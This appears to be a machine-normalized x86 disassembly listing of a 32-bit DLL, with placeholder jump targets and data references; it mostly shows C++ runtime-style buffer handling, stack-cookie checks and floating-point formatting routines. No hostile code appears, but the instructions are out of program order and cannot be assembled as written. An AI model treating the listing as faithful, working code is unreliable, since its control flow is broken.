mov eax [ esi + 0x10 ]
add ebx ebx
sub ebx [ eax ]
add ebx edi
sar ebx 0x1
xor ebx ebx
jmp r-xdata
test ecx ecx
jbe r-xdata
push 0x20
pop ecx
jmp r-xdata
mov ecx ebx
shr ecx 0x1
cmp ecx 0x20
jae r-xdata
je r-xdata
mov eax 0x7fffffff
sub eax ecx
cmp eax ebx
jae r-xdata
lea eax [ ecx + ebx ]
push 0x0
push eax
mov [ ebp - 0x4 ] eax
call sub_10001e90
mov edi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
pop ecx
pop ecx
mov [ ebp - 0x8 ] edx
test ebx ebx
jbe r-xdata
test ecx ecx
shr ecx 0x1
jne r-xdata
jne r-xdata
push ebx
push edx
push [ ebp - 0x4 ]
push edi
call sub_1000255d
mov edx [ ebp - 0x8 ]
add esp 0x10
test ebx ebx
mov eax [ esi + 0x3c ]
sub eax edx
sar eax 0x1
lea eax [ edi + eax * 2 ]
mov [ esi + 0x3c ] eax
mov eax [ esi + 0x24 ]
mov eax [ eax ]
sub eax edx
sar eax 0x1
lea ecx [ edi + eax * 2 ]
mov eax [ esi + 0x14 ]
mov ebx [ eax ]
sub ebx edx
sar ebx 0x1
lea ebx [ edi + ebx * 2 ]
mov [ eax ] ebx
mov eax [ esi + 0x24 ]
mov [ eax ] ecx
mov eax [ ebp - 0x4 ]
add eax eax
sub eax ecx
mov ecx [ esi + 0x34 ]
add eax edi
sar eax 0x1
mov [ ecx ] eax
test [ esi + 0x40 ] 0x4
je r-xdata
mov eax [ esi + 0x14 ]
mov [ esi + 0x3c ] edi
mov [ eax ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x34 ]
add eax eax
sar eax 0x1
mov [ ecx ] eax
mov eax [ esi + 0x10 ]
test [ esi + 0x40 ] 0x4
mov [ eax ] edi
mov eax [ esi + 0x20 ]
jne r-xdata
mov ecx [ esi + 0x20 ]
mov ecx [ ecx ]
mov eax [ esi + 0x24 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub ecx edx
sar ecx 0x1
lea ecx [ edi + ecx * 2 ]
sub eax ecx
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
inc eax
mov [ edi ] ecx
mov ecx [ esi + 0x30 ]
inc eax
sar eax 0x1
mov [ ecx ] eax
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
and [ eax ] 0x0
mov eax [ esi + 0x30 ]
sar edi 0x1
mov [ eax ] edi
jmp r-xdata
mov [ eax ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea eax [ ecx + 0x2 ]
mov [ esi ] eax
mov ax [ ebp + 0x8 ]
mov [ ecx ] ax
push edx
call sub_1002004f
pop ecx
test [ esi + 0x40 ] 0x1
je r-xdata
sub_100032c3
mov eax [ ecx + 0x20 ]
mov edx [ eax ]
push esi
mov eax 0xffff
test edx edx
je r-xdata
pop esi
retn 0x4
mov esi [ ecx + 0x10 ]
cmp edx [ esi ]
jbe r-xdata
mov si [ esp + 0x8 ]
push edi
mov edi eax
cmp di si
pop edi
je r-xdata
mov edx [ ecx + 0x30 ]
inc [ edx ]
mov edx [ ecx + 0x20 ]
add [ edx ] 0xfffffffe
cmp ax si
je r-xdata
cmp si [ edx - 0x2 ]
je r-xdata
xor eax eax
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ eax ] si
movzx eax si
jmp r-xdata
test [ ecx + 0x40 ] 0x2
jne r-xdata
sub_10003316
mov eax [ ecx + 0x20 ]
push edi
mov edi [ eax ]
test edi edi
jne r-xdata
mov edx [ ecx + 0x30 ]
push ebx
mov ebx [ edx ]
push esi
mov esi edi
lea ebx [ esi + ebx * 2 ]
cmp esi ebx
jae r-xdata
mov eax 0xffff
pop edi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
mov ax [ edi ]
jmp r-xdata
mov eax 0xffff
mov esi [ ecx + 0x24 ]
mov esi [ esi ]
test esi esi
je r-xdata
pop esi
pop ebx
pop edi
retn
cmp esi edi
ja r-xdata
cmp [ ecx + 0x3c ] esi
jae r-xdata
cmp [ ecx + 0x3c ] edi
jbe r-xdata
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
mov [ edx ] eax
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov ax [ eax ]
jmp r-xdata
mov [ ecx + 0x3c ] esi
sub_1000337a
push ebp
mov ebp esp
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
test [ ebp + 0x14 ] 0x1
push ebx
push esi
push edi
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov [ ecx + 0x3c ] eax
mov esi [ r--data ]
mov edx [ edx ]
test edx edx
je r-xdata
cmp [ ebp + 0x10 ] 0x2
mov edx [ r--data ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x2
mov edi [ r--data ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov ebx [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov ebx [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
test [ ebp + 0x14 ] 0x2
jne r-xdata
mov eax [ ecx + 0x10 ]
sub ebx [ eax ]
mov esi [ ebp + 0xc ]
sar ebx 0x1
add esi ebx
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
mov esi edi
jne r-xdata
mov ebx edx
mov eax [ ecx + 0x10 ]
sub ebx [ eax ]
mov esi [ ebp + 0xc ]
sar ebx 0x1
add esi ebx
jmp r-xdata
mov esi [ ebp + 0xc ]
mov esi edx
jmp r-xdata
mov ebx edi
test esi esi
jl r-xdata
test esi esi
jl r-xdata
mov esi [ ebp + 0xc ]
mov esi edx
jmp r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
sar ebx 0x1
cmp esi ebx
jg r-xdata
mov esi edi
jmp r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
sar ebx 0x1
cmp esi ebx
jg r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
pop ebp
retn 0x10
mov edx [ ecx + 0x30 ]
sub eax edi
sar eax 0x1
add eax esi
sub [ edx ] eax
mov edx [ ecx + 0x20 ]
add eax eax
add [ edx ] eax
test [ ebp + 0x14 ] 0x2
je r-xdata
sub eax edx
mov edx [ ecx + 0x34 ]
sar eax 0x1
add eax esi
sub [ edx ] eax
mov ecx [ ecx + 0x24 ]
add eax eax
add [ ecx ] eax
jmp r-xdata
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
mov ebx [ ecx + 0x34 ]
mov edi [ ecx + 0x20 ]
mov ebx [ ebx ]
mov edi [ edi ]
lea eax [ eax + ebx * 2 ]
mov [ edx ] edi
mov ecx [ ecx + 0x34 ]
sub eax edi
sar eax 0x1
mov [ ecx ] eax
jmp r-xdata
sub_100034c4
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
push esi
lea esi [ edx + eax ]
mov eax [ ecx + 0x24 ]
mov edx [ eax ]
push edi
test edx edx
je r-xdata
mov edi [ r--data ]
cmp esi edi
je r-xdata
cmp [ ecx + 0x3c ] edx
jae r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
pop edi
mov [ eax ] esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop esi
pop ebp
retn 0x20
test [ ebp + 0x24 ] 0x1
push ebx
je r-xdata
mov [ ecx + 0x3c ] edx
test [ ebp + 0x24 ] 0x2
je r-xdata
mov edx [ ecx + 0x20 ]
mov edx [ edx ]
test edx edx
je r-xdata
mov esi edi
mov edx [ eax ]
test edx edx
je r-xdata
test esi esi
jl r-xdata
test esi esi
jl r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
sar ebx 0x1
cmp esi ebx
jg r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
sar ebx 0x1
cmp esi ebx
jg r-xdata
sub eax edx
mov edx [ ecx + 0x30 ]
sar eax 0x1
add eax esi
sub [ edx ] eax
mov edx [ ecx + 0x20 ]
add eax eax
add [ edx ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
sub eax edx
mov edx [ ecx + 0x34 ]
sar eax 0x1
add eax esi
sub [ edx ] eax
mov ecx [ ecx + 0x24 ]
add eax eax
add [ ecx ] eax
jmp r-xdata
pop ebx
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
mov ebx [ ecx + 0x34 ]
mov edi [ ecx + 0x20 ]
mov ebx [ ebx ]
mov edi [ edi ]
lea eax [ eax + ebx * 2 ]
mov [ edx ] edi
mov ecx [ ecx + 0x34 ]
sub eax edi
sar eax 0x1
mov [ ecx ] eax
jmp r-xdata
sub_1000359d
mov eax [ esi ]
test eax eax
jne r-xdata
mov eax [ eax ]
jmp r-xdata
call sub_1002059f
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x10 ]
jb r-xdata
xor eax eax
add [ esi + 0x4 ] 0x1c
mov eax esi
retn
call sub_1002059f
sub_10003604
push esi
push edi
lea edi [ ecx - 0xc ]
lea esi [ edi + 0xc ]
mov ecx esi
call sub_1000307b
push esi
mov [ esi ] r--data
call sub_1001b129
test [ esp + 0x10 ] 0x1
pop ecx
je r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push edi
call sub_1002004f
pop ecx
sub_10003661
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
call sub_10001909
mov ebx [ ebp + 0x1c ]
lea esi [ ebp - 0x8 ]
call sub_10001909
mov edi esi
mov esi [ ebp + 0xc ]
call sub_100035c8
test al al
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x18
mov edi [ ebp + 0x8 ]
push [ edi + 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ ebp - 0x4 ]
call sub_10006354
pop ecx
push [ edi + 0x10 ]
mov ebx eax
call sub_100015d1
mov [ edi + 0x10 ] ebx
sub_100036b9
push 0x4
mov eax sub_1004a0f0
call sub_10023e33
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
push esi
call sub_1000471a
mov eax [ esi + 0x8 ]
mov eax [ eax + 0x4 ]
mov [ esi + eax + 0x8 ] r--data
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax esi
call sub_10023f0b
retn 0x8
sub_100036f9
push 0x40
mov eax sub_100497f7
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x40 ]
xor edi edi
mov [ ebp - 0x4c ] edi
test dl 0x2
jne r-xdata
test dl 0x4
jne r-xdata
mov ecx [ eax + 0x24 ]
cmp [ ecx ] edi
je r-xdata
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x30 ] 0x7
call sub_10002579
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
mov [ ebp - 0x4 ] 0x2
call sub_100020c6
lea ecx [ ebp - 0x48 ]
mov ecx [ eax + 0x20 ]
cmp [ ecx ] edi
je r-xdata
mov ecx [ ecx ]
mov edx [ eax + 0x3c ]
cmp edx ecx
jb r-xdata
mov edx [ eax + 0x30 ]
mov ecx [ ecx ]
mov edx [ edx ]
mov eax [ eax + 0x10 ]
mov eax [ eax ]
lea ecx [ ecx + edx * 2 ]
sub ecx eax
sar ecx 0x1
push ecx
push eax
lea ecx [ ebp - 0x2c ]
call sub_1000482d
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ eax + 0x14 ]
mov eax [ eax ]
sub ecx eax
sar ecx 0x1
push ecx
push eax
lea ecx [ ebp - 0x2c ]
call sub_1000482d
mov [ ebp - 0x4 ] edi
mov ecx edx
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_100020c6
lea ecx [ ebp - 0x2c ]
jmp r-xdata
push edi
push 0x1
call sub_10002597
mov eax ebx
call sub_10023f1f
retn 0x4
sub_100037b6
push 0x50
mov eax sub_1004927b
call sub_10023e9c
mov esi [ ebp + 0x14 ]
test [ esi + 0x10 ] 0x4000
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] edi
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx esi
call sub_10007b59
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_100063b6
pop ecx
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x38 ] eax
call sub_10007b41
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] 0x7
call sub_10002579
mov ecx [ ebp - 0x38 ]
xor edi edi
inc edi
lea eax [ ebp - 0x5c ]
mov [ ebp - 0x4 ] edi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx edx [ ebp + 0x1c ]
mov eax [ ecx ]
push edx
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ eax + 0x1c ]
mov eax edi
jmp r-xdata
call sub_10005a38
mov [ ebp - 0x4 ] 0x3
call sub_10005a4f
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_10023f1f
retn 0x18
xor edi edi
cmp eax [ ebp - 0x18 ]
jbe r-xdata
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x2c ]
call sub_10002033
push ebx
push edi
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x1
call sub_10002597
mov eax [ esi + 0x18 ]
cmp eax ebx
jle r-xdata
cmp [ ebp - 0x14 ] 0x8
mov eax [ ebp - 0x28 ]
jae r-xdata
push edi
push [ ebp + 0x18 ]
lea eax [ ebp - 0x40 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x30 ]
call sub_1000516f
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
sub eax [ ebp - 0x18 ]
mov edi eax
jmp r-xdata
push [ ebp - 0x18 ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x40 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x30 ]
call sub_1000513a
mov ecx [ eax ]
push edi
push [ ebp + 0x18 ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x34 ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x30 ]
mov [ esi + 0x18 ] ebx
call sub_1000516f
add esp 0x30
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002597
mov eax [ ebp - 0x34 ]
lea eax [ ebp - 0x28 ]
mov eax [ esi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_10003907
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ esp + 0x1c ]
mov ebx ecx
push eax
push ebx
call sub_10004e6d
add esp 0x10
push eax
lea eax [ esp + 0x20 ]
push 0x40
push eax
call sub_1002088b
push eax
lea eax [ esp + 0x2c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10004ee1
mov ecx [ esp + 0x8c ]
add esp 0x30
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn 0x18
sub_10003980
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ esp + 0x1c ]
mov ebx ecx
push eax
push ebx
call sub_10004e6d
add esp 0x10
push eax
lea eax [ esp + 0x20 ]
push 0x40
push eax
call sub_1002088b
push eax
lea eax [ esp + 0x2c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10004ee1
mov ecx [ esp + 0x8c ]
add esp 0x30
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn 0x18
sub_100039f9
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ esp + 0x20 ]
push eax
push ebx
call sub_10004e6d
add esp 0x10
push eax
lea eax [ esp + 0x24 ]
push 0x40
push eax
call sub_1002088b
push eax
lea eax [ esp + 0x30 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10004ee1
mov ecx [ esp + 0x90 ]
add esp 0x34
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn 0x1c
sub_10003a75
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ esp + 0x20 ]
push eax
push ebx
call sub_10004e6d
add esp 0x10
push eax
lea eax [ esp + 0x24 ]
push 0x40
push eax
call sub_1002088b
push eax
lea eax [ esp + 0x30 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10004ee1
mov ecx [ esp + 0x90 ]
add esp 0x34
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn 0x1c
sub_10003af1
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x94
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x90 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ esp + 0x18 ] ecx
mov ecx [ esi + 0x14 ]
xor ebx ebx
cmp ecx ebx
mov [ esp + 0x14 ] eax
push edi
mov eax 0x2000
jg r-xdata
mov edi ecx
push 0x24
pop ecx
cmp edi ecx
mov [ esp + 0x20 ] ecx
jg r-xdata
test [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
fld [ ebp + 0x1c ]
sub edi [ esp + 0x20 ]
mov edx ecx
and edx 0x3000
mov [ esp + 0x14 ] ebx
cmp edx eax
jne r-xdata
mov [ esp + 0x20 ] edi
push 0x6
pop ecx
push ecx
push ecx
fstp [ esp ]
push [ esp + 0x28 ]
lea eax [ esp + 0x2c ]
push ecx
push 0x0
push eax
push [ esp + 0x34 ]
call sub_10004909
add esp 0x10
push eax
lea eax [ esp + 0x38 ]
push 0x6c
push eax
call sub_1002088b
push eax
push edi
push ebx
push [ esp + 0x38 ]
lea eax [ esp + 0x50 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esp + 0x54 ]
push [ esp + 0x5c ]
call sub_1000496d
mov ecx [ esp + 0xe0 ]
mov eax [ esp + 0x5c ]
add esp 0x44
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn 0x1c
fld [ r--data ]
fmul st1
fucomp st1
fnstsw ax
test ah 0x44
jpo r-xdata
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov [ esp + 0x13 ] bl
fxch st1
fxch st1
mov [ esp + 0x13 ] 0x1
fchs
jmp r-xdata
cmp [ esp + 0x14 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
pop edx
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ esp + 0x14 ] edx
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ esp + 0x13 ] 0x0
fstp st1
je r-xdata
cmp edi edx
jl r-xdata
fchs
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx 0x1388
jae r-xdata
sub edi edx
fmul st1
add ebx edx
jmp r-xdata
sub_10003c71
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x94
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x90 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ esp + 0x18 ] ecx
mov ecx [ esi + 0x14 ]
mov [ esp + 0x14 ] eax
push edi
mov eax 0x2000
test ecx ecx
jg r-xdata
mov edi ecx
push 0x24
pop ecx
cmp edi ecx
mov [ esp + 0x20 ] ecx
jg r-xdata
test [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
sub edi [ esp + 0x20 ]
and [ esp + 0x10 ] 0x0
and [ esp + 0x14 ] 0x0
mov edx ecx
and edx 0x3000
cmp edx eax
jne r-xdata
mov [ esp + 0x20 ] edi
push 0x6
pop ecx
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ esp + 0xf ] 0x0
jmp r-xdata
mov [ esp + 0xf ] 0x1
fchs
fld [ r--data ]
push 0xa
fcom st1
mov ebx 0x1388
pop edx
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ esp + 0x10 ] ebx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ esp + 0x10 ] edx
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ esp + 0xf ] 0x0
fstp st1
je r-xdata
cmp edi edx
jl r-xdata
push ecx
push ecx
fstp [ esp ]
push [ esp + 0x28 ]
lea eax [ esp + 0x2c ]
push ecx
push 0x4c
push eax
push [ esp + 0x34 ]
call sub_10004909
add esp 0x10
push eax
lea eax [ esp + 0x38 ]
push 0x6c
push eax
call sub_1002088b
push eax
push edi
push [ esp + 0x34 ]
lea eax [ esp + 0x4c ]
push [ esp + 0x34 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esp + 0x54 ]
push [ esp + 0x5c ]
call sub_1000496d
mov ecx [ esp + 0xe0 ]
mov eax [ esp + 0x5c ]
add esp 0x44
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn 0x1c
fchs
jmp r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp [ esp + 0x14 ] ebx
jae r-xdata
sub edi edx
fmul st1
add [ esp + 0x14 ] edx
jmp r-xdata
sub_10003de6
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push eax
push r--data
lea eax [ esp + 0x18 ]
push 0x40
push eax
mov ebx ecx
call sub_1002088b
push eax
lea eax [ esp + 0x24 ]
push eax
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push ebx
call sub_10004ee1
mov ecx [ esp + 0x84 ]
add esp 0x30
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_10020040
mov esp ebp
pop ebp
retn 0x18
sub_10003e4d
push 0x60
mov eax sub_10048f7b
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
or [ ebp - 0x50 ] 0xffffffff
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x24 ]
xor ebx ebx
mov [ ebp - 0x6c ] eax
mov eax [ esi + 0x10 ]
inc ebx
mov [ ebp - 0x54 ] ecx
mov ecx esi
test eax 0x4000
je r-xdata
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x5c ] edi
call sub_10007b59
lea ecx [ ebp - 0x5c ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x4
mov esi [ esi + 0x10 ]
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x54 ]
call sub_10005198
add esp 0x18
push eax
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001bb94
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x60 ]
mov esi eax
call sub_10007b41
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x64 ] eax
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10007b59
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_100063b6
pop ecx
or esi 0xffffffff
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10007b41
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_10004853
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_10005a38
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_10006e82
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_10002597
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_10005c07
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10005a4f
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_10006e82
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_10002597
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10006709
test al al
mov eax [ ebp - 0x58 ]
je r-xdata
cmp [ ebp - 0x5c ] edi
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10006453
add esp 0x10
push edi
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10002597
jmp r-xdata
lea eax [ ebp - 0x48 ]
cmp [ ebp - 0x50 ] edi
jge r-xdata
or [ eax ] ebx
cmp esi ebx
ja r-xdata
mov ecx [ ebp - 0x6c ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x68 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10023f1f
retn 0x20
sub_10003feb
push 0x38
mov eax sub_100483df
call sub_10023e9c
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10007b59
and [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x10 ]
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_10005198
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10007b41
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
